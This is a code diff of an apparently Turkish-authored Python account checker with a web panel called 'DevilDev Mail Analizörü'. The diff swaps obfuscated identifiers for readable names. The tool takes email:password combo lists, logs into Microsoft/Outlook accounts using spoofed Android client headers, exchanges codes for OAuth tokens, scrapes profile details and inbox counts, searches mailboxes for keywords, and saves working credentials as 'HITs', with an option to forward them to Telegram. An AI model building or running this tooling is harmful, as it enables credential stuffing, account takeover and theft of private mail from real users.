-                  if ',AC:null,urlFedConvertRename' in text: raise LoginError('IP BAN')
-                  if any(k in text for k in ('account.live.com/recover?mkt', 'recover?mkt', 'account.live.com/identity/confirm?mkt', '/Abuse?mkt=')): raise LoginError('2FA')
-                  self.code = self.kodyazmayibirakacam(url) or self.kodyazmayibirakacam(text)
-                  success = False
-                  if self.code: success = True
-                  elif 'ANON' in cookies: success = True
-                  elif 'WLSSC' in cookies: success = True
-                  elif 'https://login.live.com/oauth20_desktop.srf' in url: success = True
-                  elif 'sSigninName' in text: success = True
-                  elif 'access_token' in text or 'refresh_token' in text: success = True
-                  elif 'window.location' in text and self.kodyazmayibirakacam(text): success = True
-                  elif 'i0281' not in text and 'loginfmt' not in text: success = True
-                  if not success: raise LoginError('BAD')
-                  birileriyiz = self.session.cookies.get('MSPCID', '')
-                  self.cid = birileriyiz.upper() if birileriyiz else None
+                  resp = self.session.post(login_url, data=payload, headers=headers, allow_redirects=True, timeout=30)
+                  text, url, cookies = resp.text, str(resp.url), self.get_cookie_string()
+                  if "Sign in to your Microsoft account" in text: raise LoginError("BAD")
+                  if ",AC:null,urlFedConvertRename" in text: raise LoginError("IP BAN")
+                  if any(k in text for k in ("account.live.com/recover?mkt", "recover?mkt", "account.live.com/identity/confirm?mkt", "/Abuse?mkt=")): raise LoginError("2FA")
+                  self.code = self.extract_code(url) or self.extract_code(text)
+                  success = any([self.code, "ANON" in cookies, "WLSSC" in cookies, "https://login.live.com/oauth20_desktop.srf" in url, "sSigninName" in text, "access_token" in text or "refresh_token" in text, "window.location" in text and self.extract_code(text), "i0281" not in text and "loginfmt" not in text])
+                  if not success: raise LoginError("BAD")
+                  cid = self.session.cookies.get("MSPCID", "")
+                  self.cid = cid.upper() if cid else None
                   return True
-              def brinofernandes(self):
+
+              def exchange_code_for_tokens(self):
                   if not self.code: return False
-                  url = 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token'
-                  data = 'client_info=1&client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf' + f'&grant_type=authorization_code&code={self.code}&scope=offline_access%20openid%20profile%20service%3A%3Aoutlook.office.com%3A%3AMBI_SSL'
-                  headers = {'Accept-Encoding': 'gzip', 'client-request-id': '3d0f0eea-617a-4b9c-a747-100934dca583', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8', 'correlation-id': '3d0f0eea-617a-4b9c-a747-100934dca583', 'Host': 'login.microsoftonline.com', 'return-client-request-id': 'false', 'User-Agent': 'Mozilla/5.0 (compatible; MSAL 1.0)', 'x-client-OS': '32', 'x-client-SKU': 'MSAL.xplat.android', 'x-client-src-SKU': 'MSAL.xplat.android', 'x-client-Ver': '1.1.0+ad8a8025'}
+                  url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
+                  data = "client_info=1&client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" + f"&grant_type=authorization_code&code={self.code}&scope=offline_access%20openid%20profile%20service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
+                  headers = {"Accept-Encoding": "gzip", "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583", "Connection": "Keep-Alive", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "correlation-id": "3d0f0eea-617a-4b9c-a747-100934dca583", "Host": "login.microsoftonline.com", "return-client-request-id": "false", "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)", "x-client-OS": "32", "x-client-SKU": "MSAL.xplat.android", "x-client-src-SKU": "MSAL.xplat.android", "x-client-Ver": "1.1.0+ad8a8025"}
                   time.sleep(random.uniform(0.1, 0.3))
                   try:
                       resp = self.session.post(url, data=data, headers=headers, timeout=30)
                       j = resp.json()
-                      self.pornotoken = j.get('refresh_token')
-                      self.ponotoken = j.get('access_token')
-                      return bool(self.pornotoken and self.ponotoken)
+                      self.refresh_token, self.access_token = j.get("refresh_token"), j.get("access_token")
+                      return bool(self.refresh_token and self.access_token)
                   except Exception: return False
-              def mohammedsalah(self):
-                  if not self.pornotoken: return False
-                  buinboxtugaliba = 'https://odc.officeapps.live.com/odc/v2.1/federationprovider?domain=9188040d-6c67-4c5b-b112-36a304b66dad'
-                  herseybirbirinegirdiamk = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Enlightened-Hrd-Client': '1', 'Host': 'odc.officeapps.live.com', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)', 'X-CorrelationId': '3d0f0eea-617a-4b9c-a747-100934dca583', 'X-Office-Application': '145', 'X-Office-Platform': 'Android', 'X-Office-Platform-Version': '32', 'X-Office-Version': '4.2424.2', 'X-OneAuth-AppId': 'com.microsoft.office.outlook', 'X-OneAuth-AppName': 'OutlookOneAuth', 'X-OneAuth-Version': '2.5.0'}
-                  time.sleep(random.uniform(0.1, 0.3))
-                  try: self.session.get(buinboxtugaliba, headers=herseybirbirinegirdiamk, timeout=30)
+
+              def refresh_substrate_token(self):
+                  if not self.refresh_token: return False
+                  try: self.session.get("https://odc.officeapps.live.com/odc/v2.1/federationprovider?domain=9188040d-6c67-4c5b-b112-36a304b66dad", headers={"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Enlightened-Hrd-Client": "1", "Host": "odc.officeapps.live.com", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)", "X-CorrelationId": "3d0f0eea-617a-4b9c-a747-100934dca583", "X-Office-Application": "145", "X-Office-Platform": "Android", "X-Office-Platform-Version": "32", "X-Office-Version": "4.2424.2", "X-OneAuth-AppId": "com.microsoft.office.outlook", "X-OneAuth-AppName": "OutlookOneAuth", "X-OneAuth-Version": "2.5.0"}, timeout=30)
                   except Exception: pass
-                  hallederizsikintiyok = 'https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/oauth2/v2.0/token'
-                  data = 'client_info=1&client_id=0000000048170EF2' + f'&refresh_token={urllib.parse.quote(self.pornotoken, safe="")}&scope=profile%20openid%20offline_access%20https%3A%2F%2Fsubstrate.office.com%2F.default&grant_type=refresh_token'
-                  headers = {'Accept-Encoding': 'gzip', 'client-request-id': '3d0f0eea-617a-4b9c-a747-100934dca583', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8', 'correlation-id': '3d0f0eea-617a-4b9c-a747-100934dca583', 'Host': 'login.microsoftonline.com', 'return-client-request-id': 'false', 'User-Agent': 'Mozilla/5.0 (compatible; MSAL 1.0)', 'x-client-OS': '32', 'x-client-SKU': 'MSAL.xplat.android', 'x-client-src-SKU': 'MSAL.xplat.android', 'x-client-Ver': '1.1.0+ad8a8025'}
+                  url = "https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/oauth2/v2.0/token"
+                  data = "client_info=1&client_id=0000000048170EF2" + f"&refresh_token={urllib.parse.quote(self.refresh_token, safe='')}&scope=profile%20openid%20offline_access%20https%3A%2F%2Fsubstrate.office.com%2F.default&grant_type=refresh_token"
+                  headers = {"Accept-Encoding": "gzip", "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583", "Connection": "Keep-Alive", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "correlation-id": "3d0f0eea-617a-4b9c-a747-100934dca583", "Host": "login.microsoftonline.com", "return-client-request-id": "false", "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)", "x-client-OS": "32", "x-client-SKU": "MSAL.xplat.android", "x-client-src-SKU": "MSAL.xplat.android", "x-client-Ver": "1.1.0+ad8a8025"}
                   time.sleep(random.uniform(0.1, 0.3))
                   try:
-                      resp = self.session.post(hallederizsikintiyok, data=data, headers=headers, timeout=30)
-                      j = resp.json()
-                      self.poynotoken = j.get('access_token')
-                      return bool(self.poynotoken)
+                      resp = self.session.post(url, data=data, headers=headers, timeout=30)
+                      self.substrate_token = resp.json().get("access_token")
+                      return bool(self.substrate_token)
                   except Exception: return False
-              def yapmayav(self):
-                  if not self.poynotoken or not self.cid: return False
-                  urls = ['https://substrate.office.com/profileb2/v2.0/me/V1Profile', 'https://substrate.office.com/profileb2/v2.0/me/profile']
-                  for url in urls:
-                      headers = {'Accept-Encoding': 'gzip', 'Authorization': f'Bearer {self.poynotoken}', 'Connection': 'Keep-Alive', 'Host': 'substrate.office.com', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)', 'X-AnchorMailbox': f'CID:{self.cid}', 'X-ClientRequestId': '3d0f0eea-617a-4b9c-a747-100934dca583'}
+
+              def fetch_profile(self):
+                  if not self.substrate_token or not self.cid: return False
+                  for url in ["https://substrate.office.com/profileb2/v2.0/me/V1Profile", "https://substrate.office.com/profileb2/v2.0/me/profile"]:
+                      headers = {"Accept-Encoding": "gzip", "Authorization": f"Bearer {self.substrate_token}", "Connection": "Keep-Alive", "Host": "substrate.office.com", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)", "X-AnchorMailbox": f"CID:{self.cid}", "X-ClientRequestId": "3d0f0eea-617a-4b9c-a747-100934dca583"}
                       time.sleep(random.uniform(0.1, 0.2))
                       try:
-                          resp = self.session.get(url, headers=headers, timeout=30)
-                          data = resp.json()
-                          zorno = data.get('names', [])
-                          if zorno and len(zorno) > 0:
-                              forno = str(zorno[0].get('firstName', '')).strip()
-                              suri = str(zorno[0].get('lastName', '')).strip()
-                              sekso = str(zorno[0].get('displayName', '')).strip()
-                              if sekso: self.babazingozingo['Name'] = sekso
-                              elif forno or suri: self.babazingozingo['Name'] = f'{forno} {suri}'.strip()
-                          beniyuregineyaz = data.get('accounts', [])
-                          if beniyuregineyaz and len(beniyuregineyaz) > 0:
-                              cc = str(beniyuregineyaz[0].get('countryCode', '')).strip()
-                              if cc: self.babazingozingo['Country'] = cc
-                          swampattackefsooyundu = data.get('anniversaries', [])
-                          for ann in swampattackefsooyundu:
-                              if str(ann.get('type', '')).lower() == 'birthday':
-                                  day, month, year = ann.get('day', ''), ann.get('month', ''), ann.get('year', '')
-                                  if day or month or year: self.babazingozingo['Birthday'] = f'{day}-{month}-{year}'
-                                  break
-                          if not self.babazingozingo.get('Name'):
-                              name = data.get('displayNameDefault') or data.get('displayName') or data.get('name', '')
-                              if name: self.babazingozingo['Name'] = name
-                          if not self.babazingozingo.get('Country'):
-                              cc = data.get('countryCode') or data.get('country') or data.get('location', '')
-                              if cc: self.babazingozingo['Country'] = cc
-                          if not self.babazingozingo.get('Birthday'):
-                              day, month, year = data.get('birthDay', ''), data.get('birthMonth', ''), data.get('birthYear', '')
-                              if day or month or year: self.babazingozingo['Birthday'] = f'{day}-{month}-{year}'
-                          if self.babazingozingo.get('Name') or self.babazingozingo.get('Country'): return True
+                          data = self.session.get(url, headers=headers, timeout=30).json()
+                          names = data.get("names", [])
+                          if names:
+                              first, last, display = names[0].get("firstName", "").strip(), names[0].get("lastName", "").strip(), names[0].get("displayName", "").strip()
+                              self.captures["Name"] = display if display else f"{first} {last}".strip()
+                          accounts = data.get("accounts", [])
+                          if accounts and accounts[0].get("countryCode", "").strip(): self.captures["Country"] = accounts[0].get("countryCode", "").strip()
+                          for ann in data.get("anniversaries", []):
+                              if str(ann.get("type", "")).lower() == "birthday":
+                                  d, m, y = ann.get("day", ""), ann.get("month", ""), ann.get("year", "")
+                                  if d or m or y: self.captures["Birthday"] = f"{d}-{m}-{y}"; break
+                          if not self.captures.get("Name"): self.captures["Name"] = data.get("displayNameDefault") or data.get("displayName") or data.get("name", "")
+                          if not self.captures.get("Country"): self.captures["Country"] = data.get("countryCode") or data.get("country") or data.get("location", "")
+                          if not self.captures.get("Birthday"):
+                              d, m, y = data.get("birthDay", ""), data.get("birthMonth", ""), data.get("birthYear", "")
+                              if d or m or y: self.captures["Birthday"] = f"{d}-{m}-{y}"
+                          if self.captures.get("Name") or self.captures.get("Country"): return True
                       except Exception: pass
                   return False
-              def inbuxerrr(self):
-                  if not self.poynotoken: return 0
-                  url = f'https://outlook.live.com/owa/{self.email}/startupdata.ashx?app=Mini&n=0'
-                  headers = {'Host': 'outlook.live.com', 'content-length': '0', 'x-owa-sessionid': self.coid, 'x-req-source': 'Mini', 'authorization': f'Bearer {self.poynotoken}', 'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36', 'action': 'StartupData', 'x-owa-correlationid': self.coid, 'ms-cv': 'YizxQK73vePSyVZZXVeNr+.3', 'content-type': 'application/json; charset=utf-8', 'accept': '*/*', 'origin': 'https://outlook.live.com', 'x-requested-with': 'com.microsoft.office.outlook', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://outlook.live.com/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'en-US,en;q=0.9'}
+
+              def get_inbox_count(self):
+                  if not self.substrate_token: return 0
+                  url = f"https://outlook.live.com/owa/{self.email}/startupdata.ashx?app=Mini&n=0"
+                  headers = {"Host": "outlook.live.com", "content-length": "0", "x-owa-sessionid": self.coid, "x-req-source": "Mini", "authorization": f"Bearer {self.substrate_token}", "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36", "action": "StartupData", "x-owa-correlationid": self.coid, "ms-cv": "YizxQK73vePSyVZZXVeNr+.3", "content-type": "application/json; charset=utf-8", "accept": "*/*", "origin": "https://outlook.live.com", "x-requested-with": "com.microsoft.office.outlook", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://outlook.live.com/", "accept-encoding": "gzip, deflate", "accept-language": "en-US,en;q=0.9"}
                   time.sleep(random.uniform(0.1, 0.3))
                   try:
-                      resp = self.session.post(url, headers=headers, timeout=30)
-                      text = resp.text
-                      burasisey = [r'DisplayName\\\":\\\"Inbox\\\",\\\"TotalCount\\\":(\\d+)', r'DisplayName":"Inbox","TotalCount":(\d+)', r'"Inbox".*?"TotalCount":(\d+)', r'TotalCount":(\d+).*?"Inbox"']
-                      for pat in burasisey:
+                      text = self.session.post(url, headers=headers, timeout=30).text
+                      for pat in [r'DisplayName\\\":\\\"Inbox\\\",\\\"TotalCount\\\":(\\d+)', r'DisplayName":"Inbox","TotalCount":(\d+)', r'"Inbox".*?"TotalCount":(\d+)', r'TotalCount":(\d+).*?"Inbox"']:
                           match = re.search(pat, text)
                           if match:
                               total = int(match.group(1))
-                              self.babazingozingo['Inbox'] = str(total)
+                              self.captures["Inbox"] = str(total)
                               return total
                   except Exception: pass
                   return 0
-              def ulasamazsiniz(self, keyword):
-                  if not self.poynotoken or not self.cid: return {'total': 0, 'last_msg': ''}
-                  url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
-                  erlingoctopus = {'Cvid': '7ef2720e-6e59-ee2b-a217-3a4f427ab0f7', 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'Egypt Standard Time', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': keyword}, 'RefiningQueries': None, 'Size': 25, 'Sort': [{'Field': 'Score', 'SortDirection': 'Desc', 'Count': 3}, {'Field': 'Time', 'SortDirection': 'Desc'}], 'EnableTopResults': True, 'TopResultsCount': 3}], 'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}], 'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True, 'SupportedRecourseDisplayTypes': ['Suggestion', 'NoResultModification', 'NoResultFolderRefinerModification', 'NoRequeryModification', 'Modification']}, 'LogicalId': '446c567a-02d9-b739-b9ca-616e0d45905c'}
-                  headers = {'User-Agent': 'Outlook-Android/2.0', 'Pragma': 'no-cache', 'Accept': 'application/json', 'ForceSync': 'false', 'Authorization': f'Bearer {self.poynotoken}', 'X-AnchorMailbox': f'CID:{self.cid}', 'Host': 'substrate.office.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json'}
+
+              def search_keyword(self, keyword):
+                  if not self.substrate_token or not self.cid: return {"total": 0, "last_msg": ""}
+                  url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
+                  payload = {"Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7", "Scenario": {"Name": "owa.react"}, "TimeZone": "Egypt Standard Time", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]}, "From": 0, "Query": {"QueryString": keyword}, "RefiningQueries": None, "Size": 25, "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3}, {"Field": "Time", "SortDirection": "Desc"}], "EnableTopResults": True, "TopResultsCount": 3}], "AnswerEntityRequests": [{"Query": {"QueryString": keyword}, "EntityTypes": ["Event", "File"], "From": 0, "Size": 10, "EnableAsyncResolution": True}], "QueryAlterationOptions": {"EnableSuggestion": True, "EnableAlteration": True, "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]}, "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"}
+                  headers = {"User-Agent": "Outlook-Android/2.0", "Pragma": "no-cache", "Accept": "application/json", "ForceSync": "false", "Authorization": f"Bearer {self.substrate_token}", "X-AnchorMailbox": f"CID:{self.cid}", "Host": "substrate.office.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "Content-Type": "application/json"}
                   time.sleep(random.uniform(0.1, 0.2))
                   try:
-                      resp = self.session.post(url, json=erlingoctopus, headers=headers, timeout=30)
-                      data = resp.json()
-                      total = data.get('Total', 0)
-                      count = 0
-                      yenitelaldim = ''
-                      disimisikmagriyor = []
+                      data = self.session.post(url, json=payload, headers=headers, timeout=30).json()
+                      total, last_msg, results = data.get("Total", 0), "", []
                       try:
-                          hepbiroyun = data.get('EntitySets', [])
-                          if hepbiroyun and len(hepbiroyun) > 0:
-                              yarindisvar = hepbiroyun[0].get('ResultSets', [])
-                              if yarindisvar and len(yarindisvar) > 0:
-                                  disimisikmagriyor = yarindisvar[0].get('Results', [])
-                                  count = len(disimisikmagriyor)
-                                  if disimisikmagriyor and len(disimisikmagriyor) > 0:
-                                      yenitelaldim = (disimisikmagriyor[0].get('ConversationTopic', '') or disimisikmagriyor[0].get('Preview', '') or disimisikmagriyor[0].get('Subject', ''))
+                          es = data.get("EntitySets", [])
+                          if es and es[0].get("ResultSets") and es[0]["ResultSets"][0].get("Results"):
+                              results = es[0]["ResultSets"][0]["Results"]
+                              if results: last_msg = results[0].get("ConversationTopic", "") or results[0].get("Preview", "") or results[0].get("Subject", "")
                       except Exception: pass
-                      acernitro = max(total, count)
-                      return {'total': acernitro, 'last_msg': yenitelaldim}
-                  except Exception: return {'total': 0, 'last_msg': ''}
-              def kabedehacilar(self):
-                  results = {}
-                  for hepbirhata, svc_info in bababutelegraminannasinisiker.items():
-                      keyword = svc_info['sender']
-                      res = self.ulasamazsiniz(keyword)
-                      if res['total'] > 0: results[hepbirhata] = res
-                  return results
+                      return {"total": max(total, len(results)), "last_msg": last_msg}
+                  except Exception: return {"total": 0, "last_msg": ""}
+
+              def search_keywords(self):
+                  matches = {}
+                  for kw in self.keywords:
+                      if not kw.strip(): continue
+                      res = self.search_keyword(kw.strip())
+                      if res["total"] > 0: matches[kw.strip()] = res
+                  return matches
+
               def run(self):
                   self.login()
-                  if self.brinofernandes():
-                      self.mohammedsalah()
-                      self.yapmayav()
-                      self.inbuxerrr()
-                      self.results = self.kabedehacilar()
-                      if self.results: return 'HIT', self.babazingozingo, self.results
-                      else: return 'FREE', self.babazingozingo, {}
-                  return 'BAD', {}, {}
+                  if self.exchange_code_for_tokens():
+                      self.refresh_substrate_token()
+                      self.fetch_profile()
+                      self.get_inbox_count()
+                      if self.keywords:
+                          matches = self.search_keywords()
+                          return ("HIT", self.captures, matches) if matches else ("FREE", self.captures, {})
+                      return "FREE", self.captures, {}
+                  return "BAD", {}, {}
 
-          class elhamdulillah:
+          class Stats:
               def __init__(self):
                   self.lock = threading.Lock()
-                  self.total = 0
-                  self.bababualemdeteek = 0
-                  self.zencipuruna = 0
-                  self.saxsko = 0
-                  self.mahsummmedet = 0
-              def yesiam(self, stat_type):
+                  self.total = self.hits = self.free = self.bad = self.retry = 0
+                  self.start_time = time.time()
+              def add(self, stat_type):
                   with self.lock:
                       self.total += 1
-                      if stat_type == 'hit': self.bababualemdeteek += 1
-                      elif stat_type == 'custom': self.zencipuruna += 1
-                      elif stat_type == 'bad': self.saxsko += 1
-                      elif stat_type == 'retry': self.mahsummmedet += 1
+                      if stat_type == "hit": self.hits += 1
+                      elif stat_type == "free": self.free += 1
+                      elif stat_type == "bad": self.bad += 1
+                      elif stat_type == "retry": self.retry += 1
 
           buoc = 7
           budamakara = 1
-          active_task = {'status': 'idle', 'thread': None, 'stats': None}
+          active_task = {'status': 'idle', 'stats': None}
           log_queue = Queue()
           log_messages = []
 
-          def biriyetmezikincisiolsun(queue, notifier, out_file, lock, stats, log_queue):
+          def worker(queue, notifier, out_file, lock, stats, keywords):
               while True:
                   item = queue.get()
                   if item is None: queue.task_done(); break
                   email, password = item
-                  status = 'BAD'
-                  babazingozingo = {}
-                  results = {}
+                  status, babazingozingo, results = "BAD", {}, {}
                   for attempt in range(budamakara + 1):
                       try:
-                          checker = wearthelegend(email, password)
+                          checker = HotmailChecker(email, password, keywords)
                           status, babazingozingo, results = checker.run()
                           break
                       except LoginError as e:
-                          err = str(e)
-                          if err == '2FA': status = '2FA'; break
-                          elif err == 'IP BAN':
+                          if str(e) == "2FA": status = "2FA"; break
+                          elif str(e) == "IP BAN":
                               if attempt < budamakara:
-                                  stats.yesiam('retry')
-                                  log_queue.put(f'[RETRY] {email} — IP BAN')
-                                  time.sleep(3); continue
-                              status = 'BAD'; break
-                          else: status = 'BAD'; break
+                                  stats.add("retry"); log_queue.put(f'[RETRY] {email} — IP BAN'); time.sleep(3); continue
+                              status = "BAD"; break
+                          else: status = "BAD"; break
                       except Exception as e:
                           if attempt < budamakara:
-                              stats.yesiam('retry')
-                              log_queue.put(f'[RETRY] {email} — {e}')
-                              time.sleep(2); continue
-                          status = 'BAD'; break
-                  if status == 'HIT':
-                      stats.yesiam('hit')
+                              stats.add("retry"); log_queue.put(f'[RETRY] {email} — {e}'); time.sleep(2); continue
+                          status = "BAD"; break
+                  if status == "HIT":
+                      stats.add("hit")
                       portakal = [f'{s}({d["total"]})' for s, d in results.items()]
                       mandelina = ' | '.join(portakal)
                       yormamoruk = ' | '.join(f'{k}={v}' for k, v in babazingozingo.items())
                       line = f'{email}:{password} | {yormamoruk} | {mandelina}'
                       log_queue.put(f'[HIT] {email}:{password} | {yormamoruk} | {mandelina}')
                       with open(out_file, 'a', encoding='utf-8') as f: f.write(line + '\n')
-                      if notifier: notifier.bababiziz(email, password, babazingozingo, results)
-                  elif status == 'FREE':
-                      stats.yesiam('custom')
+                      if notifier: notifier.send_hit(email, password, babazingozingo, results)
+                  elif status == "FREE":
+                      stats.add("free")
                       yormamoruk = ' | '.join(f'{k}={v}' for k, v in babazingozingo.items())
                       line = f'{email}:{password} | {yormamoruk} | FREE'
                       log_queue.put(f'[FREE] {email}:{password} — {yormamoruk}')
                       with open('octofree.txt', 'a', encoding='utf-8') as f: f.write(line + '\n')
-                  stats.yesiam('bad') if status == 'BAD' else None
+                  else:
+                      stats.add("bad")
                   queue.task_done()
 
           def altiustulegend(path):
               combos = []
-              p = Path(path)
-              if not p.exists(): return []
-              with p.open('r', encoding='utf-8', errors='ignore') as f:
-                  for line in f:
-                      line = line.strip()
-                      if not line or line.startswith('#'): continue
-                      if ':' in line:
-                          email, password = line.split(':', 1)
-                          combos.append((email.strip(), password.strip()))
+              if Path(path).exists():
+                  with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                      for line in f:
+                          line = line.strip()
+                          if not line or line.startswith('#'): continue
+                          if ':' in line:
+                              email, password = line.split(':', 1)
+                              combos.append((email.strip(), password.strip()))
               return combos
 
           HTML_TEMPLATE = '''
           <!DOCTYPE html>
           <html>
           <head>
-              <title>Hotmail Inboxer Panel</title>
+              <title>DevilDev Mail Analizörü v7.3</title>
               <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
               <style>
-                  body { font-family: Arial, sans-serif; background-color: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }
-                  .container { max-width: 800px; margin: auto; background: #161b22; padding: 20px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
-                  h1 { color: #58a6ff; text-align: center; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
+                  body { background-color: #0a0a0a; color: #ffffff; font-family: Arial, sans-serif; margin: 0; padding: 0; }
+                  .container { max-width: 1200px; margin: 20px auto; background-color: #121212; border-radius: 12px; border: 1px solid #333; overflow: hidden; }
+                  .header { background-color: #121212; padding: 20px; text-align: center; border-bottom: 1px solid #333; }
+                  .logo { color: #ff003c; font-family: "Consolas", monospace; font-size: 12px; line-height: 1.1; font-weight: bold; white-space: pre; }
+                  .panel { display: flex; padding: 20px; gap: 20px; }
+                  .left-panel { width: 350px; background-color: #1e1e1e; border-radius: 10px; padding: 15px; border: 1px solid #333; }
+                  .right-panel { flex: 1; display: flex; flex-direction: column; gap: 15px; }
                   .form-group { margin-bottom: 15px; }
-                  label { display: block; margin-bottom: 5px; color: #8b949e; }
-                  input[type='text'], input[type='file'] { width: 100%; padding: 10px; border: 1px solid #30363d; border-radius: 4px; background: #0d1117; color: #c9d1d9; box-sizing: border-box; }
-                  input[type='submit'] { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }
-                  input[type='submit']:hover { background: #2ea043; }
-                  .stats { background: #0d1117; padding: 15px; border-radius: 4px; margin-top: 20px; border: 1px solid #30363d; }
-                  .log-box { background: #010409; height: 300px; overflow-y: auto; padding: 10px; border-radius: 4px; border: 1px solid #30363d; font-family: monospace; font-size: 12px; margin-top: 20px; }
-                  .hit { color: #3fb950; } .free { color: #d29922; } .retry { color: #f85149; }
-                  .download-links { margin-top: 20px; text-align: center; }
-                  .download-links a { color: #58a6ff; text-decoration: none; margin: 0 10px; font-weight: bold; }
+                  label { display: block; color: #dddddd; font-size: 11px; font-weight: bold; margin-bottom: 5px; }
+                  input[type="text"] { width: 100%; padding: 10px; background-color: #0d0d0d; border: 1px solid #ff003c; border-radius: 6px; color: #ffffff; box-sizing: border-box; outline: none; }
+                  input[type="file"] { width: 100%; padding: 10px; background-color: #0d0d0d; border: 1px dashed #ff003c; border-radius: 6px; color: #ffffff; box-sizing: border-box; outline: none; cursor: pointer; }
+                  input[type="file"]::file-selector-button { background-color: #ff003c; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; margin-right: 10px; font-weight: bold; }
+                  .btn-start { width: 100%; padding: 12px; background-color: #ff003c; color: white; border: none; border-radius: 6px; font-size: 14px; font-weight: bold; cursor: pointer; transition: background 0.2s; letter-spacing: 1px; }
+                  .btn-start:hover { background-color: #cc0030; }
+                  .btn-start:disabled { background-color: #333; color: #888; cursor: not-allowed; }
+                  .stats-bar { display: flex; gap: 15px; background-color: #1e1e1e; padding: 15px; border-radius: 10px; border: 1px solid #333; }
+                  .stat-item { text-align: center; flex: 1; }
+                  .stat-label { color: #888; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; }
+                  .stat-value { color: #ffffff; font-size: 18px; font-weight: bold; margin-top: 5px; }
+                  .stat-value.hit { color: #00ff66; }
+                  .stat-value.free { color: #ffcc00; }
+                  .stat-value.bad { color: #ff003c; }
+                  .log-box { background-color: #0d0d0d; height: 400px; overflow-y: auto; padding: 10px; border-radius: 10px; border: 1px solid #333; font-family: "Consolas", monospace; font-size: 12px; }
+                  .log-hit { color: #00ff66; } .log-free { color: #ffcc00; } .log-bad { color: #ff003c; } .log-retry { color: #ff8800; }
+                  .downloads { display: flex; gap: 10px; }
+                  .btn-download { flex: 1; padding: 10px; background-color: #1e1e1e; border: 1px solid #333; color: #ffffff; border-radius: 6px; text-align: center; text-decoration: none; transition: all 0.2s; font-weight: bold; }
+                  .btn-download:hover { border-color: #ff003c; color: #ff003c; }
               </style>
           </head>
           <body>
-              <div class='container'>
-                  <h1>🔥 Hotmail Inboxer Panel</h1>
-                  <form id='uploadForm' enctype='multipart/form-data'>
-                      <div class='form-group'>
-                          <label>Telegram Bot Token (Optional)</label>
-                          <input type='text' name='token' placeholder='123456:ABCDEF...' value='{{ token }}'>
-                      </div>
-                      <div class='form-group'>
-                          <label>Telegram Chat ID (Optional)</label>
-                          <input type='text' name='chat_id' placeholder='-100123456' value='{{ chat_id }}'>
-                      </div>
-                      <div class='form-group'>
-                          <label>Combo File (.txt)</label>
-                          <input type='file' name='file' accept='.txt' required>
-                      </div>
-                      <input type='submit' value='Start Checking' id='submitBtn'>
-                  </form>
-                  
-                  <div class='stats'>
